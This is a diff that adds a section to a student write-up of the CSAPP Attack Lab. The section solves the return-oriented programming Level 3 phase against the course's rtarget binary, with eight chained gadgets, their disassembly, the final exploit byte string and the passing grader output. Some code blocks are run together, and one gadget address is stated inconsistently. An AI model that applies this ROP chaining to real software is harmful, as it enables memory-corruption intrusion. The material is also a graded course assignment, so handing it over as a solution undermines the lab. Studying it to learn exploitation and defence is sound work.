@@ -401,6 +401,58 @@ We pass the test:
 ```
 
 ###  2.2 Level 3
+To solve Phase 5, we will use gadgets in the region of the code in rtarget demarcated by functions `start_farm` and `end_farm`.  Just like what we did in the **CI-Level3**, this time will convert our cookie value as string first, then pass it into `touch3()` as parameter `%rdi` and it will check by `hexmatch`, where `haxmatch` will also overwrite the first 40 bytes we input.
+
+As a hint from the writeup, this phase is not easy to solve and it might use more than 8 gadgets. Because of ASLR, it is impossible to write the string convert version on stack directly. Thus the first problem we need to think about is how to overcome this challenge.
+
+Just like what we analyze in `CI_Level3`, we need to cannot put our code into the first 40 type of input string, since `hexmatch` will overwrite this part of area. Thus, **It is better to put the code that its address higher than the `ret` address of `getbuf()`.**
+
+Then, due to the **ASLR**, it is impossible to know what the exactly position of string cookie. However, we can use the relative address offset to get the final string position.
+
+We can notice that there is no instruction encoding relationship for addition in the hexadecimal encoding table. Nevertheless, there has a complete addition function that exist in the gadget farm
+
+```asm
+00000000004019d6 <add_xy>:  4019d6:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax  4019da:	c3                   	retq   
+```
+As we can see in the code, it add `%rdi`, `%rsi` and store in the `%rax` in the final. Thus, we can use this function that store the address of `%rsp` in the `%rdi` and store offset in the `%rsi`, then use this infomation to find the address of cookie value.
+
+The step just like follow:
+
+1. Use `%rax` as media to make the address of `%rsp` store at `%rdi`
+2. Use `%rax` as media to make `%rsi` store the offset `0x48(72)`
+3. Add `%rdi`, `%rsi` together to get the address position of string cookie value and store it into `%rax`
+4. Pass the value of `%rax` to `%rdi`
+5. trigger the `touch3()` and pass the value already in the `%rdi` into it.
+
+Thus, we can get the assembly code like this:
+
+```asm
+// Gadget 1 : From addval_190 (0x401a03+0x3 = 0x401a06)movq %rsp,%rax ret// Gadget 2 : From setval_426 (0x4019c3 + 0x2 = 0x4019c5)movq %rax,%rdinopret// Gadget 3 : From addval_219 (0x4019a7 + 0x4 = 0x4019ab)popq %rax nop ret// Gadget 4 : From getval_481 (0x4019db + 0x2 = 0x4019db)movl %eax,%edx// Gadget 5 : From getval_159 (0x401a33 + 0x1 = 0x401a34)movl %edx,%ecx  cmpb %cl,%cl // Can skip this instrcution, cause no jmp instruction after thisret// Gadget 6 : From addval_436 (0x401a11 + 0x2 = 0x401a13)movl %ecx, %esinop nop ret// Gadget 7 : From the function of add_xy(0x4019d6)lea  (%rdi,%rsi,1),%raxret// Gadget 8(same as gadget2) : From setval_426 (0x4019c3 + 0x2 = 0x4019c5)movq %rax,%rdi nop ret
+```
+
+Disassemly code show below:
+
+```asmmethod2.o:     file format elf64-x86-64Disassembly of section .text:0000000000000000 <.text>:   0:	48 89 e0             	mov    %rsp,%rax   3:	c3                   	retq      4:	48 89 c7             	mov    %rax,%rdi   7:	90                   	nop   8:	c3                   	retq      9:	58                   	pop    %rax   a:	90                   	nop   b:	c3                   	retq      c:	89 c2                	mov    %eax,%edx   e:	89 d1                	mov    %edx,%ecx  10:	38 c9                	cmp    %cl,%cl  12:	c3                   	retq     13:	89 ce                	mov    %ecx,%esi  15:	90                   	nop  16:	90                   	nop  17:	c3                   	retq     18:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax  1c:	c3                   	retq     1d:	48 89 c7             	mov    %rax,%rdi  20:	90                   	nop  21:	c3                   	retq   
+```
+Finally, we get the address of `$rsp(0x5561dca0)` in `$rdi` and the offset value `0x48(72)` in `$rsi`. Then we use the function `add_xy ` add them together and store in `$rax`. Finally, pass it to `$rdi` to fulfill the goal of pass string format of cookie value `35 39 62 39 39 37 66 61(see CI-Level3)` into `touch3()`.
+
+The final exploit string shown below:
+
+```asm
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0006 1a 40 00 00 00 00 00  <- position of rsp, movq %rsp,%rax (Gadget1)c5 19 40 00 00 00 00 00  <- movq %rax,$rdi nop ret(Gadget2)ab 19 40 00 00 00 00 00  <- popq %rax nop ret(Gadget3)48 00 00 00 00 00 00 00  <- offset 0x48dd 19 40 00 00 00 00 00  <- movl %eax,$edx(Gadget4)34 1a 40 00 00 00 00 00  <- movl %edx, %ecx cmpb %cl(null) ret (Gadget5)13 1a 40 00 00 00 00 00  <- movl %ecx, %esi nop nop ret (Gadget6)d6 19 40 00 00 00 00 00  <- lea  (%rdi,%rsi,1),%rax ret (Gadget7: add_xy)c5 19 40 00 00 00 00 00  <-movq %rax,%rdi nop ret (Gadget8)fa 18 40 00 00 00 00 00   <- jump to touch3()35 39 62 39 39 37 66 61  <- position of string format of cookie value
+```
+
+We have passed the test:
+
+```bash
+➜  ~/cmu-15-213-CSAPP3E-lab/3.Attack_lab/target1 ./hex2raw < solutions/RoP_Level3/ROP_Level3.txt | ./rtarget -qCookie: 0x59b997faType string:Touch3!: You called touch3("59b997fa")Valid solution for level 3 with target rtargetPASS: Would have posted the following:	user id	bovik	course	15213-f15	lab	attacklab	result	1:PASS:0xffffffff:rtarget:3:00 00 00 00 00 00 00 00 00 00 00 
+	00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+	06 1A 40 00 00 00 00 00 C5 19 40 00 00 00 00 00 AB 19 40 00 00 00 00 00 48 00 00 00 00 
+	00 00 00 DD 19 40 00 00 00 00 00 34 1A 40 00 00 00 00 00 13 1A 40 00 00 00 00 00 D6 19 40 
+	00 00 00 00 00 C5 19 40 00 00 00 00 00 FA 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61 
+```
+
+### Attack Lab Finished
 
 [1]	ASLR wiki : [https://en.wikipedia.org/wiki/Address_space_layout_randomization](https://en.wikipedia.org/wiki/Address_space_layout_randomization)
 
